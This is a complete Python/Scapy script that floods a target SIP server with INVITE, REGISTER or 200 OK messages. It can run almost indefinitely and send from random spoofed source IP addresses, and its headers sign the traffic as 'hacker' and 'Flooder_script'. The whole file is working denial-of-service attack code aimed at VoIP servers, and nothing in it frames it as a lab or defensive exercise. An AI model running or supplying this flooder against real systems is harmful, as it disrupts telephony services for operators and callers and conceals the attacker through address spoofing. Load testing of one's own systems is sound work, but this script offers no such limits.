#!/usr/bin/python
# This script is "quick and dirty" and is not meant to handle all possibilities and exceptions.
# No input validation is performed. Ignore the tcpdump error when running
from random import randrange
from optparse import OptionParser
import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 
conf.verb = 0

def promisc(state):
#Manage interface promiscuity. valid states are on or off
        ret =  os.system("ip link set " + conf.iface + " promisc " + state)
        if ret == 1:
                print ("You must run this script with root permissions.")

# Parse options
usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser(usage=usage)
parser.add_option("-r", "--register", action="store_true", dest="register", default=False, help="Send a REGISTER flood instead of default INVITE.")
parser.add_option("-o", "--response", action="store_true", dest="ok", default=False, help="Send a 200 OK reponse flood instead of default INVITE")
parser.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
parser.add_option("-s", "--spoof", action="store_true", dest="spoof", default=False, help="Spoof random IP addresses.")
parser.add_option("-t", "--tcp", action="store_true", dest="tcp", default=False, help="Use TCP sockets (no spoofing)")
parser.add_option("-d", "--dest", dest="server", help="Destination SIP server")
parser.add_option("-u", "--user", dest="user", default="9195551212", help="Destination SIP user")
(options, args) = parser.parse_args()

# Initialize default values and determine interfce IP that will be sending to server
counter, i = 0, 0
client_port, server_port = 5060, 5060
pkt= IP(dst=options.server)
client = pkt.src
print ("Client interface " + conf.iface)
print ("Client interface ip " + client)
promisc("on")

counter = options.counter 
while i < counter:
	try:
		if options.spoof and not options.tcp:
 	      		client = ".".join([str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256))])
		callid = str(randrange(10000,99999))
        	#SIP Payload - Modify as needed!
		if options.register:
        		sip = ("REGISTER sip:" + options.user + "@" + options.server + " SIP/2.0\r\n"
        		"To: <sip:" + options.user + "@" + options.server + ":5060>\r\n"
        		"Via: SIP/2.0/UDP " + client +":30000;branch=z9hG4bKdeadb33f\r\n"
       			"From: hacker <sip:666@" + client + ":30000>\r\n"
        		"Call-ID: f9844fbe7dec140ca36500a0c91" + callid + "@" + client +"\r\n"
        		"CSeq: 1 INVITE\r\n"
			"User-agent: Flooder_script\r\n"
        		"Max-Forwards: 5\r\n"
        		"Content-Length: 0\r\n\r\n")
		elif options.ok:
        		sip = ("SIP/2.0 200 OK\r\n"
        		"Via: SIP/2.0/UDP " + client + ":30000;branch=z9hG4bKdeadb33f\r\n"
        		"To: <sip:" + options.user + "@" + options.server + ":5060>\r\n"
       			"From: <sip:666@" + client + ":30000>\r\n"
        		"Call-ID: f9844fbe7dec140ca36500a0c91" + callid + "@" + client +"\r\n"
        		"CSeq: 1 INVITE\r\n"
			"Contact: <sip:" + options.user + "@" + client + ":5060>\r\n"
			"User-agent: Flooder_script\r\n"
        		"Max-Forwards: 5\r\n"
        		"Content-Length: 0\r\n\r\n")
		else:
        		sip = ("INVITE sip:" + options.user + "@" + options.server + " SIP/2.0\r\n"
        		"To: \"test\"""<sip:9196090828@" + options.server + ":5060>\r\n"
        		"Via: SIP/2.0/UDP " + client + ":30000\r\n"
       			"From: \"hacker\"""<sip:88183521@" + client + ":30000>\r\n"
        		"Call-ID: f9844fbe7dec140ca36500a0c91" + callid + "@" + client +"\r\n"
        		"CSeq: 1 INVITE\r\n"
			"Contact: <sip:88183521@" + client + ":5060>\r\n"
			"User-agent: Flooder_script\r\n"
        		"Max-Forwards: 9\r\n"
        		"Content-Length: 0\r\n\r\n")
		#Send the packet we built
		if options.tcp:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((options.server, server_port))
			sent=s.send(sip)
		else:
			pkt= IP(src=client, dst=options.server)/UDP(sport=client_port, dport=server_port)/sip
        		send(pkt, iface="eth1")
		i +=1
	except (KeyboardInterrupt):
		promisc("off")
		print("Exiting traffic generation...")
		raise SystemExit

promisc("off")
